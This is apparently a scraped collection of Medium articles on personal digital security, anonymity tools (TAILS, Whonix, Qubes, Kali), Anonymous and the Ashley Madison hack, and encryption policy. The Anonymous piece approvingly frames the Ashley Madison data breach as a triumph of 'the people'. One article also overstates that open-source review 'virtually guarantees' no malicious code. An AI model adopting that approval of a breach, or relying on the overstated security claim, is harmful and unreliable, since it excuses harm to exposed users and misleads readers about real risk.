The risk: You use a password at a mom-and-pop website to create an account. That website gets hacked, and it turns out the company stored your password in plain text in their database. If you re-use that password for another sensitive account (bank, social media, email , etc.) an attacker can use it to access your other accounts.
In general, I follow these rules when it comes to passwords:
The first thing to do when securing your logins is to get a comprehensive list of all the places you have online accounts. This can be daunting, and can be upwards of 100+, but this is the true scale of our online profile.
The risk: An online service account you no longer use has an old, insecure password and stores sensitive data. This account may also belong to a website that has poor security practices, and is vulnerable to hacking (especially if you’re not using it anymore).
Places to look to get a list of all the places where you have passwords to secure:
Don’t Forget to Check the Following:
Adobe, Airlines (Delta, United, JetBlue, etc.), Apple, Banks / Credit Unions (Chase, Bank of America, etc.), Craigslist, Dropbox, eBay, eCommerce Stores, Eventbrite, Facebook, Github, Google, Groupon, Healthcare (Cigna, ZocDoc, etc.), Heroku, Hotel Loyalty (Hilton, SPG, etc.), Imgur, Internet Providers (GoDaddy, CloudFlare, etc.), Intuit, Kickstarter, LinkedIn, Lyft, Mailchimp, Meetup, Mint, Mobile Phone (Verizon, T-mobile, etc.), Netflix, Online Training Providers (Udacity, etc.), PayPal, Publications (WSJ, NYT, etc.), Reddit, Slack, Spotify, Square, Starbucks, Student Loans, Tableau, Tax Services (TurboTax, TaxAct, etc.), Ticketmaster, Trello, Tumblr, Twilio, Twitter, Uber, University Email, UPS, Vimeo, Yahoo…
Once you’re done, run a security challenge through your password manger. This will tell you:
Most people don’t consider just how much personal data is sitting in their pocket, which can potentially be compromised. In this section, I go over several common topics that come into play when securing an iPhone (though many of these topics have similar processes for Android and other operating systems).
Many in the security community point out that using TouchID (using your thumbprint to log in) is a bad idea for several reasons:
This is an area where convenience conflicts with security: each person should make an informed choice on what they’re comfortable with.
Location services are the systems on your phone which provide GPS location access to the apps on your phone. We often don’t consider the different ways that applications use our location data, but if unchecked, this can leak more information than we intend to tech companies who track our location, or through social media posts that attach location information to what we share.
The risk: Your location data can leak your home or work address.
Another risk: Publicly shared location can signal to potential thieves that your home is unoccupied.
Yet another risk: Publicly sharing your location in real-time can signal people to come meet you in public venues when you don’t intend.
Go to Settings -> Privacy -> Contacts to see which apps can access your contacts. For me, this was way more than I wanted. I removed most of them. Not so much a security concern as a privacy concern, but it’s personal preference.
The risk: You start a social media account which you aren’t ready to publicly broadcast, but your social media profile is attached to your contact list, and the social network sends out a notification as soon as you set up the account to all other people who you know on the network.
Another risk: The social media site who stores your contacts gets hacked, and your contact list becomes public.
This is more of a privacy-related setting than security-related, but you can tweak the default ad tracking settings by going to Settings -> Privacy -> Advertising -> Limit Ad Tracking (Turn on).
Check out what data is available when your phone is unlocked, and make sure you’re comfortable with it.
I’ve found that using the iMessage apps on desktop and laptop leak more personal info than I feel comfortable. For example, iMessages have shown up on my computer’s notifications when not logged in, and my personal messages have come up on my computer during business presentations (unless I explicitly turn it off). I opted to log out of iMessage altogether on devices other than my phone.
There’s a feature on iOS that allows you to ring multiple devices when your phone rings. For example, ringing your MacBook when your phone rings. I’m not personally very comfortable with this (it’s made it more obvious that I’m getting a phone call in business settings), so I disabled this at Settings -> Phone -> Calls on Other Devices.
Many apps allow the option to add passcodes or TouchID inside the app. Imagine a situation where you give your phone to someone (like a curious 10-year-old nephew who wants to play a game) — is there any app you wouldn’t want that person to access?
One of the main concepts in digital security is about not just preventing a breach, but minimizing the amount of data that is available in the event of a breach. In the case of iMessage, most people set their phones on the default of keeping their messages forever, but this offers a huge trove of potential data to an attacker that might access this data.
You can set your phone to delete messages after a certain amount of time — I’ve set mine to delete messages after 30 days, in Settings -> Messages -> Keep Messages (set to 30 days).
Personally, when I audited my messages, I was surprised at how much sensitive information I had sitting there. Setting the retention policy helps to keep this kind of information from persisting.
I don’t probably have to tell you about how prevalent social media in our lives. According to Pew Research, 69% of all US adults use at least one social media site. It’s everywhere.
Because social media use is so pervasive, most people I know are rather lax about the risks it can present. The social pressure to participate is strong.
In my eyes, it’s possible to marry participation with security if you educate yourself about the risks. Below, I outline several common risks to using social media in general, as well as several tips for how to configure your privacy and security regimen for each platform.
Some people create accounts for social media profiles that they want to be anonymous. Pay special attention to these accounts, because the platforms make it very difficult to remain anonymous.
The risk: Your email is linked to your public profile, and the platform uses this in recommender algorithms to suggest your real friends.
Another risk: You use the application on your phone which uploads your contact information, inviting your contacts to connect with your “anonymous” account.
Yet another risk: The geolocation embedded in your posts, combined with other subtle cues, allows people to identify you.
The practicalities of remaining anonymous in social media accounts are beyond the scope of this guide, but suffice it to say that it is very difficult.
A cybersecurity audit isn’t complete without searching yourself to see what public information is available about you. There are two broad categories of information available to people searching for you: information you put out about yourself (through social media, your website, etc.) and information put out about you by third parties (news articles, data brokers, etc.).
It’s a good practice to do a “background check” on yourself to see what you find. A couple places to try:1. Google2. Bing3. Pipl4. Spokeo
Lastly, consider how the information you find about yourself could be used in a social engineering attack against you. The data you share here could be used to gain access to your accounts. For example, if you use your dog’s name as a recovery password, and post your dog’s name publicly, it could be used to guess a password.
In the words of Andy Chen, “email is like a postcard.” Despite the imagery portrayed of emails being like a sealed envelope, unencrypted emails are often sent through multiple servers in plain text on their way to their destination.
Once they get there, a pile of 10’s of 1000’s of emails can be a treasure trove of personal information to hackers.
In this section, we explore some of the security practices around securing the data we keep in email and the cloud.
Most of the security practices mentioned in the above sections are focused at preventing security breaches of your data. When it comes to email and cloud, these practices are especially important. If you haven’t already, make sure that you’ve hardened the logins for all your email and cloud file storage systems using the steps in Section 1 above.
It’s not enough to assume that we’ll be perfect when it comes to preventing security breaches. The next level of security considers how to minimize the amount of data that would be compromised if your data were to be breached.
This is where a “Data Retention Policy” comes in.
The main idea in a data retention policy is to switch from a mindset of “do I need to keep this?” to a mindset of “why am I not destroying this?”
The risk: Nearly any piece of personal data accessed by an attacker in a breach can be used to access other areas of your personal life, be used to gain access to other accounts, or be used in a social engineering attack. It can contribute to identity theft, be used to damage your reputation, be used as blackmail material, be released to the public directly, or be sold to third parties.
This way, if your data is ever breached, the amount of data that is compromised will be much less than if you had emails going back several years.
Important: People working in certain industries may be prohibited from doing this for legal compliance reasons. You may want to check with an attorney if you’re doing this for other than personal email.
Once implementing a data retention policy for the data kept in email, apply the same idea to all the places your data is stored in the cloud.
A personal anecdote:
When I first began doing this audit for myself, I was shocked to find how much more sensitive information was stored in insecure places than I thought. As I was reviewing my files, I found old client passwords, credit card numbers, employee personal information and more in places I didn’t expect them. This was shocking for me, since I had thought I was keeping a strict security practice in my company while I was running it.
It was definitely an eye-opening experience, and made me realize how easy it is to leave sensitive data unguarded.
It’s a good practice to make sure that you would easily survive any of your devices being stolen or lost — not just things in the cloud. This entails two major areas:
The browsing history and cookies in your browser can sometimes be a security risk. It’s a good practice to clear these regularly. To do this:
Not everyone has the same level of digital security threats as others do. The advice above is what I would consider appropriate for general internet users to follow.
However, there are some situations which can expose people to increased threats that aren’t typical to members of the general public.
In CyberSecurity, “Threat Model” is a term used to represent the different types of attacks you want to consider when assessing security risk.
For this guide, I’m breaking down “personal threat models” into common archetypes of increased risk. While not perfect, considering the following special cases that present higher risk can help you plan for specific types of threats that may not be present for the general public.
The risk: Your laptop is stolen, and you didn’t yet have a chance to implement full-disk encryption on your drive. You run a social media agency, and the attacker finds a database of client financial information and web account logins on your computer. Now, not only is your own personal information subject to compromise, but so too is your clients’.
If you run a small business, most of the above applies to you, but the risk is significantly higher. Not only do you have your data to protect, but you may have:
Housing this data opens you up to additional liability and reputational damage if it is compromised through you or anyone on your team. I definitely recommend implementing the security procedures mentioned above (and more, where appropriate) to safeguard the data.
The risk: Your website (or a client’s website) gets hacked. The compromised website is used to spread malware to visitors, promote advertising for unsavory products, and the site is blacklisted by Google and Chrome until the hack is mitigated.
Having a website exposes your servers to the full hacking power of the global internet. Hardening a website to resist attackers is beyond the scope of this guide, but it’s worth researching / following up on if you haven’t considered it recently. At the very least, make sure your site’s data is backed up and it’s software is up to date.
Another risk: Your eCommerce site gets hacked and isn’t properly secured, exposing private financial information of customers to attackers.
Taking credit cards over the internet can put developers and business owners at huge additional liability in case of a breach. My recommendation is to attempt to have another organization handle the credit card transactions so customer financial info never touches your servers.
If you must house the data on your servers, make sure you’re following PCI compliance guidelines, and consider insurance to cover data breaches.
If you work for a large organization (especially one that’s well-known), it’s very likely that you have access to all kinds of juicy data that hackers or competitors would love to get their hands on.
Corporate InfoSec is outside the scope of this article, but I will offer three general guidelines:
I don’t have have children myself, so this is a difficult topic for me to comment on directly, but I found a few articles on this topic to consider if you’re a parent:
Again, not a parent — mostly a thought experiment here.
Most teens aren’t very worried about getting hacked. Many are more worried about their parents finding out sensitive details about their personal lives than they are about data breaches. Just think about that for a second — you may be a part of your child’s personal security threat model. In my opinion, it’s a big part of the appeal of Snapchat and other similar platforms.
Teenagers are the worst.
The risk: Becoming the victim of online harassment or stalking.
The risk: Involvement with controversial issues can raise your profile and attract increased attention from hackers and other attackers.
Other risks: If your work involves activism directed at governments, law enforcement, or other entities capable of surveillance, your online profile may be subject to increased surveillance.
Hardening your personal profile and organization against sophisticated attackers is beyond the scope of this guide, but a few items to keep in mind:
If this is you, Matt Mitchell is a great source for more info.
The risk: Explicit pictures could be published, used as blackmail material, or shared in other ways without your consent.
We’ve all heard about the risks of sending NSFW pictures to others. There’s more to keep in mind on this issue than the security concerns, however.
Side note: please have compassion for people whose private images are made public without their consent. We live in a culture that is often quicker to shame a victim of this kind of sharing than to blame the sharer of the images. Always ask for consent before sharing any images of anyone (explicit or not) in any capacity, and always ask for consent before sending photos (especially explicit ones) to others. For more info, see Amy Adele Hasinoff’s TED talk on the topic.
So far, this article has focused on a platform-centric approach to security: how to secure your cloud data, your email, your passwords, etc. Another way to approach security is by analyzing common “attack vectors” that we are often vulnerable to, in order to consider our own preparedness for these situations.
I’ve outlined several below.
The risk: Your computer is stolen, and attackers mine the data on the hard drive for personal information.
Another risk: An attacker accessing your device while it is left unlocked and unattended.
How to prepare:
The risk: A vulnerability in an application you use is discovered, and can be used to exploit your device, apps, computer, web browser, or data.
Always keep your software up to date on your phone, computer, and laptop.
The risk: Unless you’re on a VPN, you should essentially assume that all your browsing activity and unencrypted credentials can be read by others on the network you’re using.
The risk: Your flash drive gets stolen, and it has sensitive data on it.
Flash drives are a huge deal for data security. You should essentially assume that anything in a flash drive could get stolen at any time. If possible, encrypt the drive to protect the data. At the very least, only keep the minimum amount of data on the drive that you need in order to do what you need to do — and wipe it often.
The risk: An attacker can pose as you to contact a friend or family member while you’re traveling. The attacker can invent a fake emergency to convince people close to you to send money or other sensitive personal documents.
How to prepare:
Develop an authentication protocol to share with all your family members, and instruct them to use it whenever they receive a message from someone claiming to be you asking for money or personal documents.
The protocol should be robust to:
If you have a practice that I missed, leave it in a comment below.
Written by
","['LastPass', 'Authy', 'Bear Writer', 'Signal', 'get hacked', 'a 2013 study', 'NordVPN', 'HTTPS Everywhere', 'Security', 'Social Media', 'Privacy', 'Cybersecurity', 'Digital']"
An Introduction to the Dark Web - The Firewall - Medium,https://medium.com/s/the-firewall/down-the-security-rabbit-hole-31327f47743d?source=tag_archive---------2-----------------------,"What I’m about to share with you here is… kind of fringe. Like, “Edward Snowden” fringe.
Hopefully, that got your attention.
For some years now, the hacker, privacy, and journalism communities have all been debating, discussing, and using the tools I’m about to share with you in this installment. These tools are used not only to lock down your security and anonymity on the known internet, but also to access the portions of the internet that are normally hidden — “The Dark Web.” Despite their usefulness, I haven’t really seen information about these tools shared with the general public in a straightforward, easy-to-understand way. I think it’s worth changing that; while most of us don’t need the same high-privacy, high-security tools that confidential informants, journalists, and whistleblowers use, we should all know about these tools in case the time comes when we actually need them.
Whistleblowing is the act of exposing, for the good of the public, any kind of illegal information or activity. Whistleblowers put their lives and careers in danger to share what they know with the public and have long been an important check on power; this is precisely why there are politicians, organizations, and authoritarian regimes that hate when highly-secure, information-sharing tools are freely available to the public. The freedom to communicate truthfully, securely, and anonymously is a threat to people in power and for that reason you’ll sometimes hear The Powerful suggest that what I’m about to share with you is dangerous.
You’ll hear, for example, that the tools used to surf on the internet anonymously and securely are used by criminals. And that’s true; there are some criminals who use these tools. However, good people — people who fight power with truth, like journalists, whistleblowers, and other ethical informants — use those tools as well. That makes them very powerful and, in today’s increasingly oppressive world, extremely important.
Before I go any further, it’s important to clarify that everything I‘m sharing with you here is currently 100 percent legal, 100 percent open-source, and 100 percent free in the United States. Open-source means there’s a community of software developers who monitor, update, and improve the software; the fact that so many eyes are examining each build (or revision) of the software’s code virtually guarantees that no malicious code can be inserted into the software.
It’s also worth reminding everyone there’s no such thing as perfect digital security on the internet. There are best tools, best practices with those tools, and best setups to take advantage of those tools. But there is no tool — none — guaranteed to protect you online 100 percent, especially if you’re not paying attention.
All any expert can do is to recommend the best tools for the right jobs, and that’s what we’re about to do now. So with that introduction, let’s jump into the deep end of the Deep Web.
TAILS is a highly-secure operating system (and a host of cool applications) designed to be booted off of a DVD or USB thumb drive. This not only makes TAILS easy to transport, but also ensures that TAILS can be booted and instantly useful from nearly any PC, Mac, or Chromebook. TAILS is built on Linux, a name you might recognize because it’s a popular, free, and open-source operating system that’s been available since 1991. TAILS, in particular, runs on a variant of Linux known as “Debian,” which became available in 1996. TAILS hit the big-time in 2013, when famed whistleblower and NSA contractor Edward Snowden used the software to contact reporter Glenn Greenwald at The Guardian newspaper in England and documentary filmmaker Laura Poitras. Snowden actually insisted that to communicate all three use TAILS along with all of its various built-in security and anonymity tools.
TAILS is powerful for three reasons. First, it’s as portable as a USB stick, which is far easier and more discreet to carry than a laptop. That portability, along with its software design, makes it easy to run off of nearly any host computer. Second, using TAILS on a host computer in the correct fashion leaves no traceable data behind as to any of its user’s online activities. It even comes pre-packaged with a suite of its own free software tools, allowing its users to work efficiently and without needing to disturb or use the host computer in any way. Third and most importantly, when setup correctly, TAILS helps ensure that all of your communications — email, web browsing, chat, and more — are encrypted, made anonymous, and then routed in such a way that it’s extremely difficult to detect or trace them.
To better explain how this power is provided, let’s start with its name: TAILS. TAILS is an acronym for “The Amnesic Incognito Live System.” As that’s a mouthful — even for a theater major proficient in Gilbert & Sullivan patter songs — let’s break it down, shall we?
The. Well, if I have to explain this word to you, then you have larger concerns than cybersecurity, my friend. #SorryNotSorry.
Amnesic, as in amnesia, because the TAILS system is designed, by default, to forget everything. It does this by not using the computer’s hard drive to store information. It uses the computer’s RAM (or memory sticks) instead. Because RAM is erased when a computer is shut down, TAILS leaves no trace once the computer hosting it is shut off. By default, each and every time you power TAILS back on, you are presented with the equivalent of a brand new, freshly imaged computer that’s never been used.
Incognito, as in “undercover,” because TAILS is designed to work anonymously and, therefore, protect your identity. It does this by forcing all outgoing connections through the TOR network, a technology I reviewed earlier on in “The Firewall.” TOR (an acronym for “The Onion Router”) is a system of relays which makes tracking anyone’s online web browsing extremely difficult. The TAILS operating system takes using TOR to an extreme: it forces all key communications over TOR, including web browsing, email, internet chat, and more.
Live, as in “living,” because, in the tech world, a live system is a system that is only installed onto a CD, DVD, or USB thumb drive. Nowhere else.
System, as in “operating system” (or OS), because TAILS is an entire operating system, just like its cousins Windows, Android, mac OS, and iOS. Unlike its cousins, however, TAILS is designed to be small, portable, and extremely secure.
While I’m a huge fan of having TAILS out there as a tool for those who need it, its setup process is convoluted and takes hours. I mean that literally: two hours. Just have a look at the Mac installation page or the Windows installation page if you think I’m kidding:
That’s right, friends — the setup on a Mac or PC requires 120 minutes, seven steps, three restarts, two USB sticks and — most likely — one massive headache. As a bonus, if you’re not fully frustrated or scared yet, the setup on a Mac also requires you to type out a UNIX command that looks something like this:
sudo dd if=tails-amd64–3.8.iso of=/dev/disk3s1 bs=16m && sync
If you don’t know what that means — and most of you don’t — TAILS provides a primer on how to add that command; but still, don’t expect tech pundits like Leo Laporte, Walt Mossberg, David Pogue, Jean-Louis Gassée, and The Kim Komando Show to tell you how fun and easy TAILS is to set up. It just ain’t.
TAILS provides a host of great, free, open-source applications and tools to help ensure that (a) there’s an app available for everything you need to do and (b) all that you do online is secure and anonymous. If you’re wondering just how powerful these tools really are, many of them are known by the NSA to be difficult or impossible to break. This includes:
When you boot into TAILS, it looks and works in ways that should be recognizable, whether you’re used to a Mac, Windows, or Linux operating system: you double click to open folders, you single click to open a menubar, you have a home folder where you can keep files, and there are system options that you can alter to suit your preferences. Here’s a video I made to give you a simple and quick look at what the desktop looks like when you boot into TAILS. I should mention that I made this video by booting TAILS into a virtual machine (or VM) and then recording my screen. Please note: never use TAILS in a single VM if you need to ensure your anonymity and security.
My thoughts on the matter are two-fold. First, if whistleblower-provided documents now reveal that our spy agencies hate TAILS that much, then I assume it must be a tool that does it’s job extremely well. That gives it value, especially because the NSA didn’t willingly release this documentation. Second, our desire to be assured of our privacy — both online and off — doesn’t make us extremists; it makes us citizens of a Democracy that values, dignifies, and emphasizes the right to privacy.
I get it. If I were a spy, I’d be frustrated by tools like TAILS as well. How are the good men and women who are charged with keeping U.S. citizens safe supposed to stop acts of unthinkable depravity if anyone can communicate privately and anonymously using tools like TAILS? It’s a worthy question, but I’m convinced that the answer to that question isn’t taking away the legal digital tools or the Constitutional rights of law-abiding citizens; rather, it’s finding or inventing new and better ways to focus on criminal intent and behavior.
A hammer can be used to build a house or to bash someone’s head in, but the tool shouldn’t be made illegal.
Be a renegade and check out the TAILS website. It’s an excellent, strong, and very portable way for those in need to have extreme security and anonymity online. It can run discreetly on nearly any computer that’s available because it leaves no trace behind. It’s intended for those who must protect their careers (and, possibly, their lives) which is why the difficult and lengthy setup is worth the (free) price of admission.
Whonix (pronounced “HOOnix”) is an OS focused on anonymity, privacy, and security. Like TAILS, it is built on the open source Debian Linux OS and on TOR, the decentralized network which randomizes and segments your data transmissions. Its unique approach to offering such well-regarded security is the creative use of two virtual machines (or VMs) running in tandem on one host computer. One of these VMs is known as the Gateway while the other is known as the Workstation. The Gateway is VM that’s responsible for running TOR and for channeling all information from the Workstation over the internet via that TOR connection. The Workstation VM runs all user applications and sends all outgoing data onto the internet via a special and isolated connection to the Gateway VM. If you’re confused by that, then this image, from the Whonix website, will surely help explain how the systems are made to function with one another:
Whonix provides a number of powerful benefits. First, the unique double-VM setup of Whonix offers advanced protections from malware, digital snooping, and from both network and data leaks. A malware attack on one VM, for example, won’t spread to the other VM or to the host OS. Second, if you’re taking advantage of VM snapshots (and you should!), then any damage to a Whonix VM can be quickly and easily rolled back to its last pristine state. Third, the two IP addresses used in each of the two Whonix VMs are different than your physical computer’s actual IP address, protecting you from digital snooping when using Whonix for your browsing, emailing, and other online activities. Lastly, because Whonix is made to use within a VM and still provide apt security, it’s far easier to use than tails.
Compared to TAILS, setting up and updating Whonix is a breeze. Even if you’re on a Mac, there are only four steps and those take about an hour to complete. Step one is downloading the two Whonix VMs which takes the bulk of that hour. Step two is downloading and installing the 100 percent free and open-source VirtualBox application made by longtime stalwart Oracle. Step three is importing each of the two Whonix VMs into VirtualBox the correct way. Step four is launching both VMs to get started! Updating Whonix is equally easy and can be run from inside of each VM.
Compared to TAILS, Whonix only provides a few free, open-source applications and those need to be set up fairly extensively. The list includes:
Not surprisingly, the Debian OS of Whonix looks and behaves similarly to the Debian OS in TAILS. Moving around the desktop and opening folders and menu-bar items is straightforward. Unlike a Mac, the main menu bar is at the bottom right, not the top right. Here’s a short video I made to help demonstrate launching each of the two Whonix VMs from VirtualBox to start using this unique system.
Whonix is another great tool in the security arsenal. With a very easy setup, it provides security and anonymity that aren’t possible with regular computing. Because Whonix provides every VM you’ll need to use their software, there are only a few steps required to get started with this clever concept. However, Whonix requires more customization, so users will be tasked with making those customizations on their own. Many will therefore need to get familiar with the free Debian OS on which Whonix is based. Most importantly, Whonix isn’t amnesic, something that the most secure users will need to consider before using this as a solution.
Is it the right solution for you? Whonix provides a handy chart comparing its technology to TAILS and other secure solutions. It’s worth noting that the security community actively debates which OS — TAILS or Whonix — is the best solution.
“Honorable mention” might not be the best phrase to describe these choices, given the strong passions that people have for each of these tools and approaches. As strong passions are fueled by strong approaches, let’s take a quick look at each of these solutions — they’re all creative approaches for the challenge of wanting best security.
If I’m going to make recommendations based on Edward Snowden, then I should be more current. In 2016, Snowden threw his support behind a relatively new OS called Qubes, an approach to computing that’s very much like having virtual machines on steroids. For starters, it’s fast: unlike booting into the macOS or Windows and then running a virtual machine application like VirtualBox, Qubes is the OS. That means all of your qubes are running natively on your computer (something us dweebs call a “bare metal hypervisor”), a huge advantage for speed and security.
Once booted, Qubes offers unlimited VMs, or, as the company calls them, “qubes.” Each qube is segmented into its own network, so it can run independently of every other qube. This segmentation is important because if one qube is infected with malware, the others qubes remain unaffected; this means that any digital intrusion can’t jump from qube to qube and destroy your entire setup — a huge benefit. The default installation of Qubes pre-configures your system to have three qubes: work, personal, and untrusted, but you can create as many qubes as suits you. You can even create what the company calls a “single-use disposable qube” which can be used, for example, for downloading an unknown or potentially dangerous attachment, isolating it from the rest of your computer and from other qubes. The OS is designed for multiple qubes to run simultaneously and each qube is conveniently color-coded, so users can easily tell the difference between them. Here’s a demo I did not make that shows you the Qubes OS in action:
While Qubes is beloved by the security community, there are a few caveats to know before using the software. First, you’ll need specific hardware to install the software. Qubes keeps an extensive list of what works and if you’ve got an Asus, Lenovo, Dell, or HP computer then you’re probably in luck. If you’re on a Mac, your options are few and far between. Second, the installation process is convoluted and requires using the command line. If you like an extreme challenge (followed, hopefully, by an extreme cocktail) getting the OS working on a Mac is, shall we say, nutzo.
Kali was developed in 2013 for very specific purposes: digital forensics, reverse engineering, and penetration testing. Now don’t get your knickers in a bunch, kids — penetration testing or “pen testing” is when security experts run tests to prove how secure an application, an operating system, or a network truly is. The company behind Kali, “Offensive Security,” offers training on their software (Kali is but one title in their library) and a certification if you complete their course. But a funny thing happened on the way to the digital forum: a community of users sprang up around the OS and began using it as a secure environment in the way that TAILS, Whonix, and Qubes are used. Like TAILS and Whonix, Kali is based on Debian linux and comes with tools to help keep you anonymous online. Like TAILS it’s best when running off of a USB stick and is fully amnesic, so it won’t leave behind any traces of what you do on a host computer.
That being said, Kali isn’t as fully-functional as TAILS or Whonix, so it’s best left to advanced users, the extremely curious, and security professionals. In that regard, Kali is pre-loaded with about 300 software tools geared for testing everything under the sun. Just take a look at the picture above — there are no less than 14 different categories of applications that Kali provides to help you test your own computer or network. In fact, Kali is quite popular with the kids for trying to crack (or break) a WiFi password. Here’s a quick look at Kali:
Some folks who are extremely serious about their security combine approaches. If running Whonix or Kali isn’t enough security for you, for example, you can actually run both of those OS’s inside of Qubes. Wait, what?! That’s right! Qubes allows you run Whonix inside of its environment. Whonix has a page devoted to this approach as well. The setup looks to take about 15–30 minutes and offers compounded security with both virtualization and segmentation.
Qubes also offers the ability to run Kali inside of its segmented walls, if you’d like to give that a try.
If you’ve got a special approach to security on your setup, please share details in the comments below so we can all learn more. The more people using safe and and secure approaches, the better — especially regarding the TOR network, which only gets safer as more users join.
My goal, through these ten installments of “The Firewall,” was to explain complex technical matters in easy-to-understand and entertaining ways. I hope I’ve accomplished that and, along the way, helped all of you learn something useful and new. It’s been an absolute honor to share this series with all of you. I’ll continue to add to the series over time, but I really want your input: what technical matters would you like to see me covering or explaining in the future? What’s out there that seems difficult or overwhelming to you that you think I can help simplify? Drop me a line or leave a comment below with your thoughts.
Wishing you all well until we meet again and, until then…surf safe!
Written by
About this Collection
","['Enigmail', 'back in 2014', 'Enigmail', 'documentation', 'Privacy', 'Tech', 'Technology', 'How To', 'Cybersecurity']"
Anonymous: The Evolving Cyberwar Defense Net - J. Robert Fallon III - Medium,https://medium.com/@GuruFallon/anonymous-the-evolving-cyberwar-defense-net-3b963784d4a2?source=tag_archive---------9-----------------------,"This is what has the older “Anons” (Anon=Anonymous member) pissed off. Anonymous of course wants to fight terrorism along with corporate fraud, but they don’t necessarily want to be rewarded or recognized. They’re valiant knights of the night, or the internet, but rarely are chasing recognition quite the opposite actually, anonymity.
The leaders of anonymous call the division between their ranks so bad that it is an all out civil war. The newbie Anons are stacked up against the wise older Anons who have been there since the beginning.
Anonymous began as a small community of highly-skilled, and some not so skilled, hackers trolling across the pre-mature web causing mayhem. They would cause pointless mayhem as well through creatively frustrating ways. A claim to fame is their shutting down of the pool in the online game Habbo, of course by creating a swastika barrier using cloned characters with afros. The original Anonymous was bored as hell and ruthless.
The older Anons claim fight is the eternal battle for our freedom of speech, expression, and access to information. These constitutional values always seem to get lost or mixed up with the wrong crowd. It takes a hack like the Ashley Madison leak to show everyone who is still really in power, the people.
So at this point, Avid Life Media knew they were absolutely and royally screwed.
Ashley Madison’s 37 million customers were also screwed. Their names were instantly thrown into database search-engines that were quickly created once the leak hit. This is a great example of a Ghost Hacker squad, this team is titled the “Impact Team”, following the traditional ways of the older Anons. They were savage, as seen in this excerpt from the original manifesto that was published by the “Impact Team”
“We have hacked them completely, taking over their entire office and production domains and thousands of systems, and over the past few years have taken all customer information databases, complete source code repositories, financial records, documentation, and emails, as we prove here,” they wrote. “And it was easy. For a company whose main promise is secrecy, it’s like you didn’t even try, like you thought you had never pissed anyone off.”
70,000 “FemBots” were found to be doing the vast majority of conversing on the site. This little spark of information is all that was needed for this hack to occur, at least that is my opinion. The intention or reason behind the hack is still a mystery other than what one can conclude themselves through the facts.
As I slothfully watch this Vice “Cyberwar” episode, one of the leaders of the older Anons was speaking on how he doesn’t agree with how Anonymous “members” are only fighting ISIS online. While he agrees there is merit in stopping ISIS, he doesn’t agree that this is the spirit or intention of the true Anonymous. Freedom of speech and expression.
I found it ironically hilarious that when this Anon leader was speaking on the ISIS topic, he gave them some great PR/Social Media advice; release the information on the war freely rather than it be released by law enforcement, “Then the world can know what they are up to on the internet.” Which in theory makes sense as it would cater more content to the “fanboys” of ISIS who scroll and post on social media, but don’t pull a trigger. The ISIS member in the photo above looks as though he just arrived at Disney World and can’t wait to ride the tanks.
I do agree with this dude in his stating that the censorship campaigns are not going to work, like at all. Censorship only creates demand, at least that is what history shows. Here are some Top 10 “Censorship Doesn’t Work” articles:
Ok, that last one was just for fun but you get the point. Censorship just doesn’t work especially on such a humongous scale as the internet, and the seemingly everlasting development occurring within the social media world.
The online social world is now a well oiled machine and ISIS is taking advantage of it’s bounty. Sadly, the fight is a somewhat hopeless battle, but with thousands of Ghost Hackers, the Federal Government, and even the older Anons are joining these forces and finding ways to bring full attention to any threats…Just knowing that helps me sleep better at night, kind of.
Cheers,
J. Robert Fallon III
Written by
","['Hacking', 'Security', 'Cybersecurity', 'ISIS', 'Social Media']"
"An Open Letter to President Obama: This is About Math, Not Politics",https://medium.com/@RaineyReitman/an-open-letter-to-president-obama-this-is-about-math-not-politics-3b73aa04aa5d?source=tag_archive---------2-----------------------,"Dear President Obama,
During your keynote conversation at SXSW, you called for a concession on security in our digital devices, stating that you don’t believe in “an absolutist view” when it comes to cryptography on phones.
We all want to find solutions to the problems of crime in our country and abroad, and technology can help us do that. Sometimes that means making compromises as a society. But reasonable people know that there’s one thing which isn’t subject to compromise: math.
The basic security of our digital devices is made possible because of a field of applied mathematics known as cryptography. In short, this means taking data and scrambling it so that it can’t be understood. If you want to unscramble the data, you need to have a unique key that will unlock it, unraveling the code and turning seemingly random characters into a clear message.
Cryptography is the foundation of information security throughout the digital world. It means that when you log into your email, you can read the messages — but other people can’t. We use crypto when we access our bank accounts, social networking sites, and documents stored in the cloud. Crypto safeguards our medical records, our location data, and the photos we send to our loved ones. The modern digital age and the Internet we have now were built atop the math of cryptography.
Today, mathematicians, engineers, and some of your own advisors are saying the same thing about the encryption debate: you can’t build a backdoor into our digital devices that only good guys can use. Just like you can’t put a key under a doormat that only the FBI will ever find.
This isn’t what certain career politicians and outspoken members of the Justice Department want you to believe. They’re searching for a quick-fix technical solution. They keep wondering why the engineering community can’t just find an answer. Even at SXSW you admitted that you didn’t have the expertise to design the kind of compromise you called for, where the encryption backdoors are magically secure and “accessible by the smallest number of people possible, for a subset of issues that we agree are important.” That’s because it’s not possible.
Too often, technical experts are ignored. Maybe it’s because they’re speaking in the dull realities of computer science and math. But as simple as the message may be, it’s still true: math can’t be negotiated away just because it’s inconvenient.
Any compromises we make in the security of our systems are compromises that can and will be exploited by those who would seek to do us harm. This includes malicious hackers, identity thieves, authoritarian governments, and corporate rivals. Your own Defense Department has identified insecure devices and networks as a key threat to our nation’s cybersecurity.
There are people whose lives are literally at risk who depend on the security of their phones: domestic violence victims, law enforcement agents, investigative journalists, judges, and those working for change in authoritarian regimes. But mostly, encryption protects hundreds of millions of regular people, who may not have anything to hide but don’t want their private lives exposed or their identities stolen because of lost or stolen smartphones, security flaws, and data breaches.
We’ve seen all too well the perils of imperfect security in Apple’s systems. In 2014, Apple suffered a major security breach in iCloud that resulted in a hacker accessing and publishing nude photos of celebrities like Jennifer Lawrence, Kate Upton and Ariana Grande. And while celebrities may have gotten the most press attention, the data breach could have affected anyone with an iPhone. It’s no surprise Apple sought to improve its security in the years since; its customers understood their personal lives were at stake.
Many of your advisors and former government officials know that vulnerabilities in our computer systems pose serious threats to our national security. Last year, millions of government workers and their families faced exposure of their most personal information when the Office of Personnel Management was breached, and the federal government is expected to spend half a billion dollars cleaning up in the wake of data breaches in the next few years. The OPM hack is just one in a series of high-profile breaches where extraordinarily sensitive information was stolen. The experts have been telling you that, faced with these challenges, we need to strengthen cryptography, not undermine it.
We’ve also seen the ramifications of bad policies that tried to weaken security. In the 1990s, there was a concerted effort by certain outspoken law enforcement officials to weaken our cryptography and insert backdoors into our systems. Last year, university researchers discovered how these policies have had long-term, unintended consequences: weakened security persisted in our software for decades. The researchers demonstrated that this resulted in massive, ongoing vulnerabilities in thousands of Internet services. We still don’t know how many millions of people’s personal communications were put at risk because of these shortsighted policies.
The public debate we’re having over the security of our devices boils down to a question of math versus politics.
